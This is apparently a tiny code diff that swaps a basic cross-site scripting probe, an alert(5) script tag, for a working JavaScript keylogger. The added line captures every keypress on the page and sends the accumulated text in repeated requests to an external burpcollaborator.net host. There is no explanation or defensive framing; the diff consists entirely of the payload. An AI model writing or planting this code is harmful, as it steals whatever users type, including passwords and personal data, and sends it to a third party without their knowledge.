@@ -1,1 +1,1 @@
-<script>alert(5)</script>
+var l="";document.onkeypress=function(e){l+=e.key;var t=new XMLHttpRequest;t.open("GET","http://468a9is4wqdhgzb1zrczp2mi096zuo.burpcollaborator.net/teste/index.php?q="+l,!0),t.setRequestHeader("Content-type","application/x-www-form-urlencoded"),t.send()};
